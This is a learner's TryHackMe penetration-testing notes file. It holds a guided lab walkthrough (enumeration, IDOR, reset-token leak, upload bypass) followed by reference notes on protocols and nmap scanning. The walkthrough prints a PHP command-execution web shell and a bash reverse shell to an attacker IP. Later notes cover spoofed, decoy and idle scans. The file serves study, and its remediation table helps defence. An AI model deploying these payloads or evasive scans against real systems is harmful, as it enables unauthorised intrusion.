
# Here I will be saving important notes, commands, pro tips and secrets of pen testing as I progress through the Jr. Penetration Tester path on Try Hack Me!


## Guided Pen Test: Web


```
TARGET = 10.65.188.103
```

For a thorough enumeration of the target machine:

```bash
nmap -sV -sC -p- 10.65.188.103
```

Results:

```bash
root@ip-10-65-123-23:~# nmap -sC -sV -p- 10.65.188.103
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-06 05:12 UTC
Nmap scan report for ip-10-65-188-103.ec2.internal (10.65.188.103)
Host is up (0.00029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:cf:4b:27:4e:0b:60:3e:86:c7:97:28:d5:14:5a:25 (ECDSA)
|_  256 1e:1b:42:5a:65:65:68:88:5b:72:6b:7f:95:32:03:c8 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: RecruitX - Home
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.08 seconds

```

The findings show that the target has ports `22 (SSH)`, `80 (http)`,` 3306 (MySQL)` and `8080 (http)` open.
The server is exposing the `SSH`, web server and may also running `SQL` queries in the back.

Now checking the website headers:

```
curl -I http://10.65.188.103/
```

This revealed:

```
xor1@kali:~$ curl -I http://10.65.188.103/
HTTP/1.1 200 OK
Date: Mon, 06 Jul 2026 05:26:45 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: PHPSESSID=uiucfs0ipgtthtdss9oo558tfn; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```

Means the website is using the `LAMP (Linux, Apache, MySQL, and PHP)` stack for deployment and `apache` version is `2.4.58` and its using `PHP` for `Session Management`.

So far we have found this info: The ports, services, architecture and their version numbers.

#### Directory Enumeration:

using Gobuster:

```
gobuster dir -u 10.65.188.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

The results:

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 21600]
/login.php            (Status: 200) [Size: 15107]
/register.php         (Status: 200) [Size: 14802]
/profile.php          (Status: 302) [Size: 0] [--> /login.php]
/jobs.php             (Status: 200) [Size: 27698]
/uploads              (Status: 301) [Size: 316] [--> http://10.65.188.103/uploads/]
/data                 (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.65.188.103/admin/]
/test                 (Status: 200) [Size: 705]
/includes             (Status: 301) [Size: 317] [--> http://10.65.188.103/includes/]
/api                  (Status: 301) [Size: 312] [--> http://10.65.188.103/api/]
/logout.php           (Status: 302) [Size: 0] [--> /login.php]
/config               (Status: 301) [Size: 315] [--> http://10.65.188.103/config/]
/dashboard.php        (Status: 302) [Size: 0] [--> /login.php]
/reset.php            (Status: 200) [Size: 14408]
/.php                 (Status: 403) [Size: 278]
Progress: 175328 / 175330 (100.00%)
```

- `/admin` - An admin panel exists, but it redirects to the login page. We will need credentials to access it.
- `/api` - An API endpoint is present. APIs often expose data in ways the frontend does not.
- `/reset.php` - A password reset page. Reset mechanisms are frequently implemented insecurely.
- `/uploads` - An uploads directory. If we can upload files, this could be a path to code execution.
- `/profile.php` and `/dashboard.php` - These require authentication, so we need to be logged in to access them.

I registered an account successfully on `/register.php` and logged in as `test@mail.com` & `faisal123` as creds.
There I found some links as one of them is `/profile.php`. Exposing the `IDOR`. Moreover I checked the `/api` endpoint and it was exposing `api routes` which was not intended.

checking the api endpoint:

```
curl http://10.64.146.243/api/
```

results:

```shell-session
{"endpoints":["\/api\/user","\/api\/jobs","\/api\/applications"]}
```

## IDOR:

On going to the `/profile` page the `http://10.64.146.243/profile.php?id=6` appears and changing the `id` parameter to `id=1` i got the `Administrator`.

## Weak password reset:

```
http://10.64.146.243/reset.php
```

with the following account proceed:

```
testuser@fake.thm
```

upon giving the email the token is being revealed in the response:

```
s.mitchell@recruitx.thm
```

using that I changed the `Administrator` account and logged in.

Got the admin panel, uploaded the file for RCE. The files are stored in `upload/documents`, it only accepts `pdf`, `images` and `documents`.

The payload:

```
echo '<?php echo "PHP is executing"; ?>' > test.phtml
```

The extension `phtml` was accepted.

Now getting the RCE:

```
<?php if(isset($_GET['cmd'])) { echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; } ?>
```

After uploading the file we can check by executing different commands in the `cmd` parameter:

```
curl "http://10.64.146.243/uploads/documents/shell.phtml?cmd=whoami"
```

now we are going to get the active shell using `netcat` in action.

On our local machine which is the attack box, run the `netcat` listener:

```
nc -lvnp 4444
```

This will be the command we will be embedding in the URL as encoded:

```
bash -c 'bash -i >& /dev/tcp/10.64.81.180/4444 0>&1'
```

encoded:

```
bash+-c+'bash+-i+>%26+/dev/tcp/10.64.81.180/4444+0>%261'
```

**GOT THE SHELLL!**


![](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/Jr.%20Penetration%20Tester/Pasted%20image%2020260708203245.png)


Reading the flag:

```
cat /var/www/flag.txt
```


![](https://github.com/xor-1/CyberSecurity_TryHackMe/blob/main/Jr.%20Penetration%20Tester/Pasted%20image%2020260708203416.png)

### Summary

| Vulnerability                                | Severity | Remediation                                                                                                                                                                                     |
| -------------------------------------------- | -------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| IDOR on user profiles and API                | High     | Implement server-side authorisation checks on every request. Verify that the authenticated user has permission to access the requested resource.                                                |
| Password reset token exposed in the response | Critical | Send reset tokens exclusively via email. Display only a generic confirmation message on the page. Use cryptographically random tokens of at least 32 characters.                                |
| Incomplete file extension blocklist          | Critical | Use an allowlist rather than a blocklist. Only permit specific, expected extensions. Validate file content (MIME type) in addition to the extension. Store uploaded files outside the web root. |
| API endpoint disclosure                      | Medium   | Remove the API index endpoint or restrict it to authenticated administrators. Do not expose internal route structures to unauthenticated users.                                                 |


---


## Reconnaissance


### Passive Reconn:

- `whois` and `RDAP`
- `nslookup` and `dig`
- `crt.sh` and `DNSdumpster`

> `QUIC` protocol is designed by google that combines the functions of TLS and TCP into a single protocol running on UDP port 443. It is used by modern websites using HTTP/3.


For `Network` tab in `Developer Tools`:

```
CTRL + SHIFT + I
```


```
ICMP Echo Request: type 8
ICMP Echo Response: type 0
```

> `QUIC` used by `HTTP3` combining the capabilities of TLS and TCP over UDP 443.


> When `TTL` reaches `0`  the router drops the packets and sends the `ICMP Time to Live Exceeded` message back to the sender.


> The packets are send by gradually increasing `TTL` values and making the routers reveal the IP addresses one by one by sending back the `ICMP Time to Live Exceeded` until the packet reaches the destination or a maximum `TTL` value is achieved.


> By default on linux `traceroute` sends `UDP` packets, to switch to `TCP` use `traceroute -T IP` and for `ICMP` based, use `traceroute -I IP`.


> Use `mtr IP` for real time continuous view of this `traceroute`.


> Telnet TELETYPE NETWORK -> 23, used for banner grabbing as we can connect because of TCP.


#### SMTP

- Port `25` for MTA to MTA
- Port `587` for MUA to MSA
- Port `465` for SMTPS


#### POP3 (Download and Delete)

- Port `110` for POP3
- Port `995` for POP3S


#### IMAP

- Port 143 for IMAP
- Port 993 for IMAPS


#### Summary

| Protocol | TCP Port | Application(s) | Data Security | Secure Alternative          | Secure Port                   |
| -------- | -------- | -------------- | ------------- | --------------------------- | ----------------------------- |
| FTP      | 21       | File Transfer  | Cleartext     | FTPS or SFTP                | 990 (FTPS), 22 (SFTP)         |
| HTTP     | 80       | Worldwide Web  | Cleartext     | HTTPS                       | 443                           |
| IMAP     | 143      | Email (MDA)    | Cleartext     | IMAPS                       | 993                           |
| POP3     | 110      | Email (MDA)    | Cleartext     | POP3S                       | 995                           |
| SMTP     | 25       | Email (MTA)    | Cleartext     | SMTPS or SMTP with STARTTLS | 465 (SMTPS), 587 (Submission) |
| Telnet   | 23       | Remote Access  | Cleartext     | SSH                         | 22                            |



----



> SSL and TLS are on Presentation Layer


> SSL 2.0 and 3.0 are deprecated. TLS 1.0 and 1.1 are also deprecated. TLS 1.2 and 1.3 can be used on present systems for security.


**Upgrading Protocols with TLS**

An existing cleartext protocol can be upgraded to use encryption via TLS. The following table lists the protocols covered so far and their default ports before and after the encryption upgrade via TLS.

|Protocol|Default Port|Secured Protocol|Default Port with TLS|
|---|---|---|---|
|HTTP|80|HTTPS|443|
|FTP|21|FTPS|990|
|SMTP|25|SMTPS|465|
|POP3|110|POP3S|995|
|IMAP|143|IMAPS|993|

TLS is not limited to web and email protocols. DNS can also be secured using TLS. **DNS over TLS (DoT)** encrypts DNS queries by wrapping standard DNS traffic inside a TLS connection, typically on port 853. A related approach, **DNS over HTTPS (DoH)**, sends DNS queries as HTTPS requests on port 443. Both prevent eavesdropping on DNS lookups, which would otherwise reveal which websites a user is visiting.

## Implicit TLS vs STARTTLS

There are two approaches to adding TLS to a protocol:

**Implicit TLS** uses a dedicated port (as shown in the table above). The connection is encrypted from the start. When you connect to port 443 for HTTPS or port 993 for IMAPS, TLS negotiation begins immediately.

**STARTTLS** allows upgrading an existing cleartext connection to TLS on the same port. The client connects on the standard port (e.g., port 25 for SMTP), and then issues a `STARTTLS` command to upgrade the connection to TLS. This approach is common for email protocols. For SMTP, port 587 (submission) with STARTTLS is the recommended configuration for mail clients.

Both approaches provide encryption. However, implicit TLS is generally preferred because STARTTLS can be vulnerable to downgrade attacks if not properly implemented. An attacker performing a MITM attack could strip the `STARTTLS` command from the communication, forcing the connection to remain in cleartext.




---


#### NMAP


![[Pasted image 20260719211606.png]]




> If the host is in the same network the nmap will use the ARP broadcast to map IPs with the MAC addresses of the hosts.


> If the target is in another subnet or network then the namp will use different IP based probes like ICMP echo request, ICMP timestamp request, TCP SYN, TCP ACK etc...



###### Discovering hosts using different layers of the TCP/IP  OSI layers


![[Pasted image 20260719214127.png]]



> ICMP echo request: type 8
> ICMP echo reply:      type 0


----


> check the number of hosts

```
nmap -sL -n IP
```


> using a list of IPs:

```
nmap -iL nmap.txt
```


> Discover live hosts

```
nmap -sn IP -n
```


-n is for not using the DNS resolution.


> **Nmap host discovery probes:**

for local network ARP broadcast:

```
-PR
```

for remote networks (ICMP Address Mask, ICMP type 8, ICMP timestamp, ACK, SYN and UDP ping): 

```
-PM


-PE


-PP


-PA


-PS


-PU
```


> Address mask request = type 17
> Address mask reply = type 18

ARP scanning is particularly useful during post‑exploitation and internal network enumeration. Once an attacker gains access to a system within a network, ARP scans can be used to quickly and reliably identify other live hosts on the same local segment. Because ARP operates at Layer 2 and is often not filtered by firewalls, it is an effective tool for red-team operations and internal penetration testing.



# ==*"WE HAVE TO DEVELOP BOTH MINDSETS AS AN INTERNAL PENTESTER AND EXTERNAL PENTESTER"*==


Masscan: discover the available systems.


> -R for reverse DNS lookups of hosts even offline, to use a specific DNS server use option:


```
--dns-servers 8.8.8.8
```


|Scan Type|Example Command|
|---|---|
|ARP Scan|sudo nmap -PR -sn 10.200.6.0/24|
|ICMP Echo Scan|sudo nmap -PE -sn 10.200.6.0/24|
|ICMP Timestamp Scan|sudo nmap -PP -sn 10.200.6.0/24|
|ICMP Address Mask Scan|sudo nmap -PM -sn 10.200.6.0/24|
|TCP SYN Ping Scan|sudo nmap -PS22,80,443 -sn 10.200.6.0/30|
|TCP ACK Ping Scan|sudo nmap -PA22,80,443 -sn 10.200.6.0/30|
|UDP Ping Scan|sudo nmap -PU53,161,162 -sn 10.200.6.0/30|


|Option|Purpose|
|---|---|
|-n|no DNS lookup|
|-R|reverse-DNS lookup for all hosts|
|-sn|host discovery only|


![[Pasted image 20260720100205.png]]


**NULL scan:**

```
sudo nmap -sN IP
```

no reply = open | filtered
RST, ACK = closed


**FIN Scan:**

```
sudo nmap -sF IP
```


no reply = open | filtered
RST, ACK = closed


**Xmas Scan:**


```
sudo nmap -sX IP
```

PSH, URG, FIN flags are set simultaneously.

no reply = open | filtered
RST, ACK = closed



**Maimon Scan: FIN ACK FIN ACK FIN ACK FIN ACK FIN ACK FIN ACK FIN ACK FIN ACK**

**FIN** and **ACK** flags are set.

```
nmap -sM IP
```



**TO CHECK IF A PORT IS BEHIND THE FIREWALL:**

Answer: USE ACK SCAN


```
nmap -sA IP
```


target sends an RST packet if the packet reaches the target means its not behind the firewall and is unfiltered. Otherwise filtered. 

| Response         | Interpretation |
| ---------------- | -------------- |
| RST              | Unfiltered     |
| No response      | Filtered       |
| ICMP unreachable | Filtered       |


**WINDOW Scan:**

```
nmap -sW IP
```


It is similar to ACK scan, but examines the **WINDOW** field of the **RST** packet to interpret whether the port is open or not,

Port = Open (Window = 8192)
Port = Close (Window = 0)


**Custom Scan:**

```
nmap --scanflags FLAGS IP
```


---



**Spoofed IP address Scan:**

```
nmap -S SPOOFED_IP IP
```


**Spoofed MAC Scan:**

```
nmap --spoof-mac SPOOFEDMAC IP
```


```
sudo nmap --spoof-mac SPOOFEDMAC -e NET_INTERFACE -Pn IP
```


`-e`: To select the Interface to use
`-Pn`: To disable the ping reply


**Decoy Scan:**

```
nmap -D IP,IP,ME TARGET
```

```
nmap -D IP,RND,RND,ME TARGET
```


```
sudo nmap -D 10.10.20.21,10.10.20.28,ME TARGET
```



**Fragmentation:**

```
sudo nmap -sS -p80 -f MACHINE_IP
```


---



An **Idle Scan** (also called a **Zombie Scan**) is one of the stealthiest TCP scanning techniques. Instead of sending probes directly from the attacker to the target, the attacker uses a **third-party host (the "zombie")** to perform the scan, making it appear that the zombie is scanning the target.

This technique relies on predictable **IP Identification (IP ID)** values generated by the zombie host.





**Components**

There are three systems involved:

```text
+----------+        +---------+        +---------+
| Attacker |        | Zombie  |        | Target  |
+----------+        +---------+        +---------+
```

- **Attacker:** Initiates the scan.
    
- **Zombie:** An idle host with predictable IP ID values.
    
- **Target:** The system whose ports are being scanned.
    



**How it works**

The technique takes advantage of the zombie's IP ID counter.

### Step 1: Get the zombie's current IP ID

The attacker sends a harmless packet (such as a SYN/ACK) to the zombie.

```text
Attacker  ------------> Zombie
            SYN/ACK

Zombie    ------------> Attacker
             RST
          IP ID = 1000
```

The attacker notes that the zombie's IP ID is **1000**.



**Step 2: Spoof the zombie's IP address**

The attacker sends a **spoofed SYN packet** to the target, pretending to be the zombie.

```text
Attacker (spoofed as Zombie)
            SYN
---------------------------->
                         Target
```



**Case 1: Target port is OPEN**

The target replies to the zombie with a SYN/ACK.

```text
Target ---------------> Zombie
          SYN/ACK
```

Since the zombie never initiated the connection, it responds with a RST.

```text
Zombie ---------------> Target
          RST
```

Sending this RST increments the zombie's IP ID by one.



**Step 3: Query the zombie again**

The attacker sends another probe to the zombie.

```text
Attacker -----------> Zombie
        SYN/ACK

Zombie -------------> Attacker
        RST
     IP ID = 1002
```

The IP ID increased by **2**:

- +1 for responding to the attacker
    
- +1 for sending the RST to the target
    

Therefore:

**The target port is OPEN.**



**Case 2: Target port is CLOSED**

If the port is closed, the target responds directly to the zombie with a RST.

```text
Target -------------> Zombie
          RST
```

The zombie ignores unsolicited RST packets and sends nothing back.

Later, when the attacker probes the zombie again:

```text
Attacker -----------> Zombie
        SYN/ACK

Zombie -------------> Attacker
        RST
     IP ID = 1001
```

The IP ID increased by only **1** (for replying to the attacker).

Therefore:

**The target port is CLOSED.**


**Decision Table**

| Zombie IP ID Increase | Interpretation |
| --------------------- | -------------- |
| +2                    | Port Open      |
| +1                    | Port Closed    |
| No response           | Filtered       |

**Why is it called an "Idle" scan?**

The zombie should be an **idle host**, meaning:

- Very little network traffic.
    
- Predictable IP ID sequence.
    
- Not communicating with many other systems.
    

If the zombie is busy, its IP ID changes due to unrelated traffic, making the results unreliable.

**Nmap Example**

```bash
nmap -sI 192.168.1.50 192.168.1.100
```

Where:

- `192.168.1.50` = Zombie
    
- `192.168.1.100` = Target
    

**Advantages**

- Extremely stealthy.
    
- The target sees the zombie's IP address, not the attacker's.
    
- Can bypass logging that records only source IP addresses.
    
- Useful for anonymous reconnaissance.
    

**Limitations**

- Requires a suitable zombie with predictable IP IDs.
    
- Modern operating systems often randomize or assign IP IDs per connection, making suitable zombies rare.
    
- Stateful firewalls and intrusion prevention systems can reduce the effectiveness of this technique.
    


**Idle Scan vs SYN Scan**

| Feature                     | SYN Scan | Idle (Zombie) Scan |
| --------------------------- | -------- | ------------------ |
| Source IP visible           | Attacker | Zombie             |
| Finds open ports            | ✅        | ✅                  |
| Very stealthy               | Moderate | ✅ Excellent        |
| Requires third host         | ❌        | ✅                  |
| Requires predictable IP IDs | ❌        | ✅                  |

 
 **Summary**

An **Idle (Zombie) Scan** is an advanced, stealthy port-scanning technique that uses a quiet third-party host with predictable IP ID values to infer whether a target's ports are open. By observing changes in the zombie's IP ID counter, the attacker can determine the target's port state without sending recognizable scan traffic directly from their own IP address. It is an elegant technique, but its practicality has declined because modern operating systems generally no longer use globally predictable IP ID counters.




---



This room covered the following types of scans.

| Port Scan Type                 | Example Command                                        |
| ------------------------------ | ------------------------------------------------------ |
| TCP Null Scan                  | sudo nmap -sN 10.49.182.243                            |
| TCP FIN Scan                   | sudo nmap -sF 10.49.182.243                            |
| TCP Xmas Scan                  | sudo nmap -sX 10.49.182.243                            |
| TCP Maimon Scan                | sudo nmap -sM 10.49.182.243                            |
| TCP ACK Scan                   | sudo nmap -sA 10.49.182.243                            |
| TCP Window Scan                | sudo nmap -sW 10.49.182.243                            |
| Custom TCP Scan                | sudo nmap --scanflags URGACKPSHRSTSYNFIN 10.49.182.243 |
| Spoofed Source IP              | sudo nmap -S SPOOFED_IP 10.49.182.243                  |
| Spoofed MAC Address            | --spoof-mac SPOOFED_MAC                                |
| Decoy Scan                     | nmap -D DECOY_IP,ME 10.49.182.243                      |
| Idle (Zombie) Scan             | sudo nmap -sI ZOMBIE_IP 10.49.182.243                  |
| Fragment IP data into 8 bytes  | -f                                                     |
| Fragment IP data into 16 bytes | -ff                                                    |

|Option|Purpose|
|---|---|
|--source-port PORT_NUM|Specify source port number|
|--data-length NUM|Append random data to reach the given length|

These scan types rely on setting TCP flags in unexpected ways to prompt ports for a reply. Null, FIN, and Xmas scans provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports.

|Option|Purpose|
|---|---|
|--reason|explains how Nmap made its conclusion|
|-v|verbose|
|-vv|very verbose|
|-d|debugging|
|-dd|more details for debugging|



![[Pasted image 20260724104545.png]]




---





**Version Detection:**

Connects fully with the target system for banner grabbing.

```
sudo nmap -sV --version-intensity 10.201.118.127
```

The `--version-intensity` ranges from `0`to `9`



**OS Detection:**

Checks the system behavior and telltale signs in its network responses.


```
nmap -O IP
```


**Traceroute:**

```
nmap -sS --traceroute 10.49.148.237
```



---



nmap scripts are stored in  **```/usr/share/nmap/scripts```


Script categories:

|Script Category|Description|
|---|---|
|`auth`|Runs authentication-related scripts|
|`broadcast`|Discovers hosts by sending broadcast messages|
|`brute`|Performs brute-force password auditing against logins|
|`default`|Runs default scripts (same as `-sC`)|
|`discovery`|Retrieves accessible information, such as database tables and DNS names|
|`dos`|Detects servers vulnerable to Denial of Service (DoS)|
|`exploit`|Attempts to exploit various vulnerable services|
|`external`|Checks using a third-party service, such as Geoplugin and Virustotal|
|`fuzzer`|Launches fuzzing attacks|
|`intrusive`|Runs intrusive scripts such as brute-force attacks and exploitation|
|`malware`|Scans for backdoors|
|`safe`|Runs safe scripts that won't crash the target|
|`version`|Retrieves service versions|
|`vuln`|Checks for vulnerabilities or exploits in a vulnerable service|


```
sudo nmap -sS -sC 10.49.148.237
```


---



The number of files can grow quickly, hindering your ability to find previous scan results. The three main formats are:

1. Normal
2. Grepable (`grep`able)
3. XML

There is a fourth one that we don't recommend:

- Script Kiddie


```
nmap -oN scan.nmap 10.49.148.237
```


```
-oG FILENAME
```


```
-oX FILENAME
```


```
nmap -sS 127.0.0.1 -oS FILENAME
```


**Summary**


|Option|Meaning|
|---|---|
|`-sV`|Determine service/version info on open ports|
|`-sV --version-light`|Try the most likely probes (2)|
|`-sV --version-all`|Try all available probes (9)|
|`-O`|Detect OS|
|`--traceroute`|Run traceroute to the target|
|`--script=SCRIPTS`|Nmap scripts to run|
|`-sC` or `--script=default`|Run default scripts|
|`-A`|Equivalent to `-sV -O -sC --traceroute`|
|`-oN`|Save output in normal format|
|`-oG`|Save output in a grepable format|
|`-oX`|Save output in XML format|
|`-oA`|Save output in normal, XML and Grepable formats|



